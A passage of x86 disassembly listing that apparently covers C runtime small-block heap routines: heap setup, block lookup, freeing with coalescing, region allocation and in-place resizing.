  426665:	mov    ecx,DWORD PTR ds:0x45d58c
  42666b:	mov    ecx,DWORD PTR [ecx+0x40]
  42666e:	test   ecx,ecx
  426670:	je     0x426674
  426672:	inc    DWORD PTR [ecx]
  426674:	mov    ecx,DWORD PTR ds:0x45d58c
  42667a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42667d:	inc    DWORD PTR [ecx+0xb4]
  426683:	test   eax,eax
  426685:	je     0x42669a
  426687:	cmp    DWORD PTR [eax],0x0
  42668a:	jne    0x42669a
  42668c:	cmp    eax,0x45d538
  426691:	je     0x42669a
  426693:	push   eax
  426694:	call   0x426513
  426699:	pop    ecx
  42669a:	mov    eax,DWORD PTR [esi+0x64]
  42669d:	pop    esi
  42669e:	ret    
  42669f:	push   0xc
  4266a1:	push   0x429868
  4266a6:	call   0x425340
  4266ab:	push   0xc
  4266ad:	call   0x4254ff
  4266b2:	pop    ecx
  4266b3:	and    DWORD PTR [ebp-0x4],0x0
  4266b7:	call   0x4265dd
  4266bc:	mov    DWORD PTR [ebp-0x1c],eax
  4266bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266c3:	call   0x4266d1
  4266c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266cb:	call   0x42537b
  4266d0:	ret    
  4266d1:	push   0xc
  4266d3:	call   0x42546b
  4266d8:	pop    ecx
  4266d9:	ret    
  4266da:	push   0x140
  4266df:	push   0x0
  4266e1:	push   DWORD PTR ds:0x45e140
  4266e7:	call   DWORD PTR ds:0x429030
  4266ed:	test   eax,eax
  4266ef:	mov    ds:0x45df00,eax
  4266f4:	jne    0x4266f7
  4266f6:	ret    
  4266f7:	mov    ecx,DWORD PTR [esp+0x4]
  4266fb:	and    DWORD PTR ds:0x45def8,0x0
  426702:	and    DWORD PTR ds:0x45defc,0x0
  426709:	mov    ds:0x45df08,eax
  42670e:	xor    eax,eax
  426710:	mov    DWORD PTR ds:0x45df04,ecx
  426716:	mov    DWORD PTR ds:0x45df0c,0x10
  426720:	inc    eax
  426721:	ret    
  426722:	mov    eax,ds:0x45defc
  426727:	lea    ecx,[eax+eax*4]
  42672a:	mov    eax,ds:0x45df00
  42672f:	lea    ecx,[eax+ecx*4]
  426732:	jmp    0x426746
  426734:	mov    edx,DWORD PTR [esp+0x4]
  426738:	sub    edx,DWORD PTR [eax+0xc]
  42673b:	cmp    edx,0x100000
  426741:	jb     0x42674c
  426743:	add    eax,0x14
  426746:	cmp    eax,ecx
  426748:	jb     0x426734
  42674a:	xor    eax,eax
  42674c:	ret    
  42674d:	push   ebp
  42674e:	mov    ebp,esp
  426750:	sub    esp,0x10
  426753:	mov    ecx,DWORD PTR [ebp+0x8]
  426756:	mov    eax,DWORD PTR [ecx+0x10]
  426759:	push   esi
  42675a:	mov    esi,DWORD PTR [ebp+0xc]
  42675d:	push   edi
  42675e:	mov    edi,esi
  426760:	sub    edi,DWORD PTR [ecx+0xc]
  426763:	add    esi,0xfffffffc
  426766:	shr    edi,0xf
  426769:	mov    ecx,edi
  42676b:	imul   ecx,ecx,0x204
  426771:	lea    ecx,[ecx+eax*1+0x144]
  426778:	mov    DWORD PTR [ebp-0x10],ecx
  42677b:	mov    ecx,DWORD PTR [esi]
  42677d:	dec    ecx
  42677e:	test   cl,0x1
  426781:	mov    DWORD PTR [ebp-0x4],ecx
  426784:	jne    0x426a61
  42678a:	push   ebx
  42678b:	lea    ebx,[ecx+esi*1]
  42678e:	mov    edx,DWORD PTR [ebx]
  426790:	mov    DWORD PTR [ebp-0xc],edx
  426793:	mov    edx,DWORD PTR [esi-0x4]
  426796:	mov    DWORD PTR [ebp-0x8],edx
  426799:	mov    edx,DWORD PTR [ebp-0xc]
  42679c:	test   dl,0x1
  42679f:	mov    DWORD PTR [ebp+0xc],ebx
  4267a2:	jne    0x426818
  4267a4:	sar    edx,0x4
  4267a7:	dec    edx
  4267a8:	cmp    edx,0x3f
  4267ab:	jbe    0x4267b0
  4267ad:	push   0x3f
  4267af:	pop    edx
  4267b0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267b3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267b6:	jne    0x4267fa
  4267b8:	cmp    edx,0x20
  4267bb:	mov    ebx,0x80000000
  4267c0:	jae    0x4267db
  4267c2:	mov    ecx,edx
  4267c4:	shr    ebx,cl
  4267c6:	lea    ecx,[edx+eax*1+0x4]
  4267ca:	not    ebx
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267d0:	dec    BYTE PTR [ecx]
  4267d2:	jne    0x4267f7
  4267d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267d7:	and    DWORD PTR [ecx],ebx
  4267d9:	jmp    0x4267f7
  4267db:	lea    ecx,[edx-0x20]
  4267de:	shr    ebx,cl
  4267e0:	lea    ecx,[edx+eax*1+0x4]
  4267e4:	not    ebx
  4267e6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267ed:	dec    BYTE PTR [ecx]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],ebx
  4267f7:	mov    ebx,DWORD PTR [ebp+0xc]
  4267fa:	mov    edx,DWORD PTR [ebx+0x8]
  4267fd:	mov    ebx,DWORD PTR [ebx+0x4]
  426800:	mov    ecx,DWORD PTR [ebp-0x4]
  426803:	add    ecx,DWORD PTR [ebp-0xc]
  426806:	mov    DWORD PTR [edx+0x4],ebx
  426809:	mov    edx,DWORD PTR [ebp+0xc]
  42680c:	mov    ebx,DWORD PTR [edx+0x4]
  42680f:	mov    edx,DWORD PTR [edx+0x8]
  426812:	mov    DWORD PTR [ebx+0x8],edx
  426815:	mov    DWORD PTR [ebp-0x4],ecx
  426818:	mov    edx,ecx
  42681a:	sar    edx,0x4
  42681d:	dec    edx
  42681e:	cmp    edx,0x3f
  426821:	jbe    0x426826
  426823:	push   0x3f
  426825:	pop    edx
  426826:	mov    ebx,DWORD PTR [ebp-0x8]
  426829:	and    ebx,0x1
  42682c:	mov    DWORD PTR [ebp-0xc],ebx
  42682f:	jne    0x4268c4
  426835:	sub    esi,DWORD PTR [ebp-0x8]
  426838:	mov    ebx,DWORD PTR [ebp-0x8]
  42683b:	sar    ebx,0x4
  42683e:	push   0x3f
  426840:	mov    DWORD PTR [ebp+0xc],esi
  426843:	dec    ebx
  426844:	pop    esi
  426845:	cmp    ebx,esi
  426847:	jbe    0x42684b
  426849:	mov    ebx,esi
  42684b:	add    ecx,DWORD PTR [ebp-0x8]
  42684e:	mov    edx,ecx
  426850:	sar    edx,0x4
  426853:	dec    edx
  426854:	cmp    edx,esi
  426856:	mov    DWORD PTR [ebp-0x4],ecx
  426859:	jbe    0x42685d
  42685b:	mov    edx,esi
  42685d:	cmp    ebx,edx
  42685f:	je     0x4268bf
  426861:	mov    ecx,DWORD PTR [ebp+0xc]
  426864:	mov    esi,DWORD PTR [ecx+0x4]
  426867:	cmp    esi,DWORD PTR [ecx+0x8]
  42686a:	jne    0x4268a7
  42686c:	cmp    ebx,0x20
  42686f:	mov    esi,0x80000000
  426874:	jae    0x42688d
  426876:	mov    ecx,ebx
  426878:	shr    esi,cl
  42687a:	not    esi
  42687c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426880:	dec    BYTE PTR [ebx+eax*1+0x4]
  426884:	jne    0x4268a7
  426886:	mov    ecx,DWORD PTR [ebp+0x8]
  426889:	and    DWORD PTR [ecx],esi
  42688b:	jmp    0x4268a7
  42688d:	lea    ecx,[ebx-0x20]
  426890:	shr    esi,cl
  426892:	not    esi
  426894:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42689b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42689f:	jne    0x4268a7
  4268a1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268a4:	and    DWORD PTR [ecx+0x4],esi
  4268a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268aa:	mov    esi,DWORD PTR [ecx+0x8]
  4268ad:	mov    ecx,DWORD PTR [ecx+0x4]
  4268b0:	mov    DWORD PTR [esi+0x4],ecx
  4268b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268b6:	mov    esi,DWORD PTR [ecx+0x4]
  4268b9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268bc:	mov    DWORD PTR [esi+0x8],ecx
  4268bf:	mov    esi,DWORD PTR [ebp+0xc]
  4268c2:	jmp    0x4268c7
  4268c4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268c7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268cb:	jne    0x4268d5
  4268cd:	cmp    ebx,edx
  4268cf:	je     0x426955
  4268d5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268d8:	lea    ecx,[ecx+edx*8]
  4268db:	mov    ebx,DWORD PTR [ecx+0x4]
  4268de:	mov    DWORD PTR [esi+0x8],ecx
  4268e1:	mov    DWORD PTR [esi+0x4],ebx
  4268e4:	mov    DWORD PTR [ecx+0x4],esi
  4268e7:	mov    ecx,DWORD PTR [esi+0x4]
  4268ea:	mov    DWORD PTR [ecx+0x8],esi
  4268ed:	mov    ecx,DWORD PTR [esi+0x4]
  4268f0:	cmp    ecx,DWORD PTR [esi+0x8]
  4268f3:	jne    0x426955
  4268f5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4268f9:	mov    BYTE PTR [ebp+0xf],cl
  4268fc:	inc    cl
  4268fe:	cmp    edx,0x20
  426901:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426905:	jae    0x42692c
  426907:	cmp    BYTE PTR [ebp+0xf],0x0
  42690b:	jne    0x42691b
  42690d:	mov    ecx,edx
  42690f:	mov    ebx,0x80000000
  426914:	shr    ebx,cl
  426916:	mov    ecx,DWORD PTR [ebp+0x8]
  426919:	or     DWORD PTR [ecx],ebx
  42691b:	mov    ebx,0x80000000
  426920:	mov    ecx,edx
  426922:	shr    ebx,cl
  426924:	lea    eax,[eax+edi*4+0x44]
  426928:	or     DWORD PTR [eax],ebx
  42692a:	jmp    0x426955
  42692c:	cmp    BYTE PTR [ebp+0xf],0x0
  426930:	jne    0x426942
  426932:	lea    ecx,[edx-0x20]
  426935:	mov    ebx,0x80000000
  42693a:	shr    ebx,cl
  42693c:	mov    ecx,DWORD PTR [ebp+0x8]
  42693f:	or     DWORD PTR [ecx+0x4],ebx
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    edx,0x80000000
  42694a:	shr    edx,cl
  42694c:	lea    eax,[eax+edi*4+0xc4]
  426953:	or     DWORD PTR [eax],edx
  426955:	mov    eax,DWORD PTR [ebp-0x4]
  426958:	mov    DWORD PTR [esi],eax
  42695a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42695e:	mov    eax,DWORD PTR [ebp-0x10]
  426961:	dec    DWORD PTR [eax]
  426963:	jne    0x426a60
  426969:	mov    eax,ds:0x45def8
  42696e:	test   eax,eax
  426970:	je     0x426a52
  426976:	mov    ecx,DWORD PTR ds:0x45df10
  42697c:	mov    esi,DWORD PTR ds:0x4290ac
  426982:	push   0x4000
  426987:	shl    ecx,0xf
  42698a:	add    ecx,DWORD PTR [eax+0xc]
  42698d:	mov    ebx,0x8000
  426992:	push   ebx
  426993:	push   ecx
  426994:	call   esi
  426996:	mov    ecx,DWORD PTR ds:0x45df10
  42699c:	mov    eax,ds:0x45def8
  4269a1:	mov    edx,0x80000000
  4269a6:	shr    edx,cl
  4269a8:	or     DWORD PTR [eax+0x8],edx
  4269ab:	mov    eax,ds:0x45def8
  4269b0:	mov    eax,DWORD PTR [eax+0x10]
  4269b3:	mov    ecx,DWORD PTR ds:0x45df10
  4269b9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269c1:	mov    eax,ds:0x45def8
  4269c6:	mov    eax,DWORD PTR [eax+0x10]
  4269c9:	dec    BYTE PTR [eax+0x43]
  4269cc:	mov    eax,ds:0x45def8
  4269d1:	mov    ecx,DWORD PTR [eax+0x10]
  4269d4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269d8:	jne    0x4269e3
  4269da:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269de:	mov    eax,ds:0x45def8
  4269e3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269e7:	jne    0x426a52
  4269e9:	push   ebx
  4269ea:	push   0x0
  4269ec:	push   DWORD PTR [eax+0xc]
  4269ef:	call   esi
  4269f1:	mov    eax,ds:0x45def8
  4269f6:	push   DWORD PTR [eax+0x10]
  4269f9:	push   0x0
  4269fb:	push   DWORD PTR ds:0x45e140
  426a01:	call   DWORD PTR ds:0x42902c
  426a07:	mov    eax,ds:0x45defc
  426a0c:	mov    edx,DWORD PTR ds:0x45df00
  426a12:	lea    eax,[eax+eax*4]
  426a15:	shl    eax,0x2
  426a18:	mov    ecx,eax
  426a1a:	mov    eax,ds:0x45def8
  426a1f:	sub    ecx,eax
  426a21:	lea    ecx,[ecx+edx*1-0x14]
  426a25:	push   ecx
  426a26:	lea    ecx,[eax+0x14]
  426a29:	push   ecx
  426a2a:	push   eax
  426a2b:	call   0x428280
  426a30:	mov    eax,DWORD PTR [ebp+0x8]
  426a33:	add    esp,0xc
  426a36:	dec    DWORD PTR ds:0x45defc
  426a3c:	cmp    eax,DWORD PTR ds:0x45def8
  426a42:	jbe    0x426a48
  426a44:	sub    DWORD PTR [ebp+0x8],0x14
  426a48:	mov    eax,ds:0x45df00
  426a4d:	mov    ds:0x45df08,eax
  426a52:	mov    eax,DWORD PTR [ebp+0x8]
  426a55:	mov    ds:0x45def8,eax
  426a5a:	mov    DWORD PTR ds:0x45df10,edi
  426a60:	pop    ebx
  426a61:	pop    edi
  426a62:	pop    esi
  426a63:	leave  
  426a64:	ret    
  426a65:	mov    eax,ds:0x45defc
  426a6a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a70:	push   edi
  426a71:	xor    edi,edi
  426a73:	cmp    eax,ecx
  426a75:	jne    0x426aab
  426a77:	lea    eax,[ecx+ecx*4+0x50]
  426a7b:	shl    eax,0x2
  426a7e:	push   eax
  426a7f:	push   DWORD PTR ds:0x45df00
  426a85:	push   edi
  426a86:	push   DWORD PTR ds:0x45e140
  426a8c:	call   DWORD PTR ds:0x4290d0
  426a92:	cmp    eax,edi
  426a94:	jne    0x426a9a
  426a96:	xor    eax,eax
  426a98:	pop    edi
  426a99:	ret    
  426a9a:	add    DWORD PTR ds:0x45df0c,0x10
  426aa1:	mov    ds:0x45df00,eax
  426aa6:	mov    eax,ds:0x45defc
  426aab:	mov    ecx,DWORD PTR ds:0x45df00
  426ab1:	push   esi
  426ab2:	push   0x41c4
  426ab7:	push   0x8
  426ab9:	push   DWORD PTR ds:0x45e140
  426abf:	lea    eax,[eax+eax*4]
  426ac2:	lea    esi,[ecx+eax*4]
  426ac5:	call   DWORD PTR ds:0x429030
  426acb:	cmp    eax,edi
  426acd:	mov    DWORD PTR [esi+0x10],eax
  426ad0:	jne    0x426ad6
  426ad2:	xor    eax,eax
  426ad4:	jmp    0x426b19
  426ad6:	push   0x4
  426ad8:	push   0x2000
  426add:	push   0x100000
  426ae2:	push   edi
  426ae3:	call   DWORD PTR ds:0x4290cc
  426ae9:	cmp    eax,edi
  426aeb:	mov    DWORD PTR [esi+0xc],eax
  426aee:	jne    0x426b02
  426af0:	push   DWORD PTR [esi+0x10]
  426af3:	push   edi
  426af4:	push   DWORD PTR ds:0x45e140
  426afa:	call   DWORD PTR ds:0x42902c
  426b00:	jmp    0x426ad2
  426b02:	or     DWORD PTR [esi+0x8],0xffffffff
  426b06:	mov    DWORD PTR [esi],edi
  426b08:	mov    DWORD PTR [esi+0x4],edi
  426b0b:	inc    DWORD PTR ds:0x45defc
  426b11:	mov    eax,DWORD PTR [esi+0x10]
  426b14:	or     DWORD PTR [eax],0xffffffff
  426b17:	mov    eax,esi
  426b19:	pop    esi
  426b1a:	pop    edi
  426b1b:	ret    
  426b1c:	push   ebp
  426b1d:	mov    ebp,esp
  426b1f:	push   ecx
  426b20:	push   ecx
  426b21:	mov    ecx,DWORD PTR [ebp+0x8]
  426b24:	mov    eax,DWORD PTR [ecx+0x8]
  426b27:	push   ebx
  426b28:	push   esi
  426b29:	mov    esi,DWORD PTR [ecx+0x10]
  426b2c:	push   edi
  426b2d:	xor    ebx,ebx
  426b2f:	jmp    0x426b34
  426b31:	shl    eax,1
  426b33:	inc    ebx
  426b34:	test   eax,eax
  426b36:	jge    0x426b31
  426b38:	mov    eax,ebx
  426b3a:	imul   eax,eax,0x204
  426b40:	lea    eax,[eax+esi*1+0x144]
  426b47:	push   0x3f
  426b49:	mov    DWORD PTR [ebp-0x8],eax
  426b4c:	pop    edx
  426b4d:	mov    DWORD PTR [eax+0x8],eax
  426b50:	mov    DWORD PTR [eax+0x4],eax
  426b53:	add    eax,0x8
  426b56:	dec    edx
  426b57:	jne    0x426b4d
  426b59:	push   0x4
  426b5b:	mov    edi,ebx
  426b5d:	push   0x1000
  426b62:	shl    edi,0xf
  426b65:	add    edi,DWORD PTR [ecx+0xc]
  426b68:	push   0x8000
  426b6d:	push   edi
  426b6e:	call   DWORD PTR ds:0x4290cc
  426b74:	test   eax,eax
  426b76:	jne    0x426b80
  426b78:	or     eax,0xffffffff
  426b7b:	jmp    0x426c1d
  426b80:	lea    edx,[edi+0x7000]
  426b86:	cmp    edi,edx
  426b88:	mov    DWORD PTR [ebp-0x4],edx
  426b8b:	ja     0x426bd0
  426b8d:	mov    ecx,edx
  426b8f:	sub    ecx,edi
  426b91:	shr    ecx,0xc
  426b94:	lea    eax,[edi+0x10]
  426b97:	inc    ecx
  426b98:	or     DWORD PTR [eax-0x8],0xffffffff
  426b9c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426ba3:	lea    edx,[eax+0xffc]
  426ba9:	mov    DWORD PTR [eax],edx
  426bab:	lea    edx,[eax-0x1004]
  426bb1:	mov    DWORD PTR [eax-0x4],0xff0
  426bb8:	mov    DWORD PTR [eax+0x4],edx
  426bbb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bc5:	add    eax,0x1000
  426bca:	dec    ecx
  426bcb:	jne    0x426b98
  426bcd:	mov    edx,DWORD PTR [ebp-0x4]
  426bd0:	mov    eax,DWORD PTR [ebp-0x8]
  426bd3:	add    eax,0x1f8
  426bd8:	lea    ecx,[edi+0xc]
  426bdb:	mov    DWORD PTR [eax+0x4],ecx
  426bde:	mov    DWORD PTR [ecx+0x8],eax
  426be1:	lea    ecx,[edx+0xc]
  426be4:	mov    DWORD PTR [eax+0x8],ecx
  426be7:	mov    DWORD PTR [ecx+0x4],eax
  426bea:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bef:	xor    edi,edi
  426bf1:	inc    edi
  426bf2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426bf9:	mov    al,BYTE PTR [esi+0x43]
  426bfc:	mov    cl,al
  426bfe:	inc    cl
  426c00:	test   al,al
  426c02:	mov    eax,DWORD PTR [ebp+0x8]
  426c05:	mov    BYTE PTR [esi+0x43],cl
  426c08:	jne    0x426c0d
  426c0a:	or     DWORD PTR [eax+0x4],edi
  426c0d:	mov    edx,0x80000000
  426c12:	mov    ecx,ebx
  426c14:	shr    edx,cl
  426c16:	not    edx
  426c18:	and    DWORD PTR [eax+0x8],edx
  426c1b:	mov    eax,ebx
  426c1d:	pop    edi
  426c1e:	pop    esi
  426c1f:	pop    ebx
  426c20:	leave  
  426c21:	ret    
  426c22:	push   ebp
  426c23:	mov    ebp,esp
  426c25:	sub    esp,0xc
  426c28:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2b:	mov    eax,DWORD PTR [ecx+0x10]
  426c2e:	push   ebx
  426c2f:	push   esi
  426c30:	mov    esi,DWORD PTR [ebp+0x10]
  426c33:	push   edi
  426c34:	mov    edi,DWORD PTR [ebp+0xc]
  426c37:	mov    edx,edi
  426c39:	sub    edx,DWORD PTR [ecx+0xc]
  426c3c:	add    esi,0x17
  426c3f:	shr    edx,0xf
  426c42:	mov    ecx,edx
  426c44:	imul   ecx,ecx,0x204
  426c4a:	lea    ecx,[ecx+eax*1+0x144]
  426c51:	mov    DWORD PTR [ebp-0xc],ecx
  426c54:	mov    ecx,DWORD PTR [edi-0x4]
  426c57:	and    esi,0xfffffff0
  426c5a:	dec    ecx
  426c5b:	cmp    esi,ecx
  426c5d:	lea    edi,[ecx+edi*1-0x4]
  426c61:	mov    ebx,DWORD PTR [edi]
  426c63:	mov    DWORD PTR [ebp+0x10],ecx
  426c66:	mov    DWORD PTR [ebp-0x4],ebx
  426c69:	jle    0x426dc4
  426c6f:	test   bl,0x1
  426c72:	jne    0x426dbd
  426c78:	add    ebx,ecx
  426c7a:	cmp    esi,ebx
  426c7c:	jg     0x426dbd
  426c82:	mov    ecx,DWORD PTR [ebp-0x4]
  426c85:	sar    ecx,0x4
  426c88:	dec    ecx
  426c89:	cmp    ecx,0x3f
  426c8c:	mov    DWORD PTR [ebp-0x8],ecx
  426c8f:	jbe    0x426c97
  426c91:	push   0x3f
  426c93:	pop    ecx
  426c94:	mov    DWORD PTR [ebp-0x8],ecx
  426c97:	mov    ebx,DWORD PTR [edi+0x4]
  426c9a:	cmp    ebx,DWORD PTR [edi+0x8]
  426c9d:	jne    0x426ce2
  426c9f:	cmp    ecx,0x20
  426ca2:	mov    ebx,0x80000000
  426ca7:	jae    0x426cc3
  426ca9:	shr    ebx,cl
  426cab:	mov    ecx,DWORD PTR [ebp-0x8]
  426cae:	lea    ecx,[ecx+eax*1+0x4]
  426cb2:	not    ebx
  426cb4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cb8:	dec    BYTE PTR [ecx]
  426cba:	jne    0x426ce2
  426cbc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cbf:	and    DWORD PTR [ecx],ebx
  426cc1:	jmp    0x426ce2
  426cc3:	add    ecx,0xffffffe0
  426cc6:	shr    ebx,cl
  426cc8:	mov    ecx,DWORD PTR [ebp-0x8]
  426ccb:	lea    ecx,[ecx+eax*1+0x4]
  426ccf:	not    ebx
  426cd1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426cd8:	dec    BYTE PTR [ecx]
  426cda:	jne    0x426ce2
  426cdc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cdf:	and    DWORD PTR [ecx+0x4],ebx
  426ce2:	mov    ecx,DWORD PTR [edi+0x8]
  426ce5:	mov    ebx,DWORD PTR [edi+0x4]
  426ce8:	mov    DWORD PTR [ecx+0x4],ebx
  426ceb:	mov    ecx,DWORD PTR [edi+0x4]
  426cee:	mov    edi,DWORD PTR [edi+0x8]
  426cf1:	mov    DWORD PTR [ecx+0x8],edi
  426cf4:	mov    ecx,DWORD PTR [ebp+0x10]
  426cf7:	sub    ecx,esi
  426cf9:	add    DWORD PTR [ebp-0x4],ecx
  426cfc:	cmp    DWORD PTR [ebp-0x4],0x0
  426d00:	jle    0x426dab
  426d06:	mov    edi,DWORD PTR [ebp-0x4]
  426d09:	mov    ecx,DWORD PTR [ebp+0xc]
  426d0c:	sar    edi,0x4
  426d0f:	dec    edi
  426d10:	cmp    edi,0x3f
  426d13:	lea    ecx,[ecx+esi*1-0x4]
  426d17:	jbe    0x426d1c
  426d19:	push   0x3f
  426d1b:	pop    edi
  426d1c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d1f:	lea    ebx,[ebx+edi*8]
  426d22:	mov    DWORD PTR [ebp+0x10],ebx
  426d25:	mov    ebx,DWORD PTR [ebx+0x4]
  426d28:	mov    DWORD PTR [ecx+0x4],ebx
  426d2b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d2e:	mov    DWORD PTR [ecx+0x8],ebx
  426d31:	mov    DWORD PTR [ebx+0x4],ecx
  426d34:	mov    ebx,DWORD PTR [ecx+0x4]
  426d37:	mov    DWORD PTR [ebx+0x8],ecx
  426d3a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d3d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d40:	jne    0x426d99
  426d42:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d46:	mov    BYTE PTR [ebp+0x13],cl
  426d49:	inc    cl
  426d4b:	cmp    edi,0x20
  426d4e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d52:	jae    0x426d70
  426d54:	cmp    BYTE PTR [ebp+0x13],0x0
  426d58:	jne    0x426d68
  426d5a:	mov    ecx,edi
  426d5c:	mov    ebx,0x80000000
  426d61:	shr    ebx,cl
  426d63:	mov    ecx,DWORD PTR [ebp+0x8]
  426d66:	or     DWORD PTR [ecx],ebx
  426d68:	lea    eax,[eax+edx*4+0x44]
  426d6c:	mov    ecx,edi
  426d6e:	jmp    0x426d90
  426d70:	cmp    BYTE PTR [ebp+0x13],0x0
  426d74:	jne    0x426d86
  426d76:	lea    ecx,[edi-0x20]
  426d79:	mov    ebx,0x80000000
  426d7e:	shr    ebx,cl
  426d80:	mov    ecx,DWORD PTR [ebp+0x8]
  426d83:	or     DWORD PTR [ecx+0x4],ebx
  426d86:	lea    eax,[eax+edx*4+0xc4]
  426d8d:	lea    ecx,[edi-0x20]
  426d90:	mov    edx,0x80000000
  426d95:	shr    edx,cl
  426d97:	or     DWORD PTR [eax],edx
  426d99:	mov    edx,DWORD PTR [ebp+0xc]
  426d9c:	mov    ecx,DWORD PTR [ebp-0x4]
  426d9f:	lea    eax,[edx+esi*1-0x4]
  426da3:	mov    DWORD PTR [eax],ecx
  426da5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426da9:	jmp    0x426dae
  426dab:	mov    edx,DWORD PTR [ebp+0xc]
  426dae:	lea    eax,[esi+0x1]
  426db1:	mov    DWORD PTR [edx-0x4],eax
  426db4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426db8:	jmp    0x426ef9
  426dbd:	xor    eax,eax
  426dbf:	jmp    0x426efc
  426dc4:	jge    0x426ef9
  426dca:	mov    ebx,DWORD PTR [ebp+0xc]
  426dcd:	sub    DWORD PTR [ebp+0x10],esi
  426dd0:	lea    ecx,[esi+0x1]
  426dd3:	mov    DWORD PTR [ebx-0x4],ecx
  426dd6:	lea    ebx,[ebx+esi*1-0x4]
  426dda:	mov    esi,DWORD PTR [ebp+0x10]
  426ddd:	sar    esi,0x4
  426de0:	dec    esi
  426de1:	cmp    esi,0x3f
  426de4:	mov    DWORD PTR [ebp+0xc],ebx
  426de7:	mov    DWORD PTR [ebx-0x4],ecx
  426dea:	jbe    0x426def
  426dec:	push   0x3f
  426dee:	pop    esi
  426def:	test   BYTE PTR [ebp-0x4],0x1
  426df3:	jne    0x426e79
  426df9:	mov    esi,DWORD PTR [ebp-0x4]
  426dfc:	sar    esi,0x4
  426dff:	dec    esi
  426e00:	cmp    esi,0x3f
  426e03:	jbe    0x426e08
  426e05:	push   0x3f
  426e07:	pop    esi
  426e08:	mov    ecx,DWORD PTR [edi+0x4]
  426e0b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e0e:	jne    0x426e52
  426e10:	cmp    esi,0x20
  426e13:	mov    ebx,0x80000000
  426e18:	jae    0x426e33
  426e1a:	mov    ecx,esi
  426e1c:	shr    ebx,cl
  426e1e:	lea    esi,[esi+eax*1+0x4]
  426e22:	not    ebx
  426e24:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e28:	dec    BYTE PTR [esi]
  426e2a:	jne    0x426e4f
  426e2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2f:	and    DWORD PTR [ecx],ebx
  426e31:	jmp    0x426e4f
  426e33:	lea    ecx,[esi-0x20]
  426e36:	shr    ebx,cl
  426e38:	lea    ecx,[esi+eax*1+0x4]
  426e3c:	not    ebx
  426e3e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e45:	dec    BYTE PTR [ecx]
  426e47:	jne    0x426e4f
  426e49:	mov    ecx,DWORD PTR [ebp+0x8]
  426e4c:	and    DWORD PTR [ecx+0x4],ebx
  426e4f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e52:	mov    ecx,DWORD PTR [edi+0x8]
  426e55:	mov    esi,DWORD PTR [edi+0x4]
  426e58:	mov    DWORD PTR [ecx+0x4],esi
  426e5b:	mov    esi,DWORD PTR [edi+0x8]
  426e5e:	mov    ecx,DWORD PTR [edi+0x4]
  426e61:	mov    DWORD PTR [ecx+0x8],esi
  426e64:	mov    esi,DWORD PTR [ebp+0x10]
  426e67:	add    esi,DWORD PTR [ebp-0x4]
  426e6a:	mov    DWORD PTR [ebp+0x10],esi
  426e6d:	sar    esi,0x4
  426e70:	dec    esi
  426e71:	cmp    esi,0x3f
  426e74:	jbe    0x426e79
  426e76:	push   0x3f
  426e78:	pop    esi
  426e79:	mov    ecx,DWORD PTR [ebp-0xc]
  426e7c:	lea    ecx,[ecx+esi*8]
  426e7f:	mov    edi,DWORD PTR [ecx+0x4]
  426e82:	mov    DWORD PTR [ebx+0x8],ecx
  426e85:	mov    DWORD PTR [ebx+0x4],edi
  426e88:	mov    DWORD PTR [ecx+0x4],ebx
  426e8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e8e:	mov    DWORD PTR [ecx+0x8],ebx
  426e91:	mov    ecx,DWORD PTR [ebx+0x4]
  426e94:	cmp    ecx,DWORD PTR [ebx+0x8]
  426e97:	jne    0x426ef0
  426e99:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426e9d:	mov    BYTE PTR [ebp+0xf],cl
  426ea0:	inc    cl
  426ea2:	cmp    esi,0x20
  426ea5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426ea9:	jae    0x426ec7
  426eab:	cmp    BYTE PTR [ebp+0xf],0x0
  426eaf:	jne    0x426ebf
  426eb1:	mov    ecx,esi
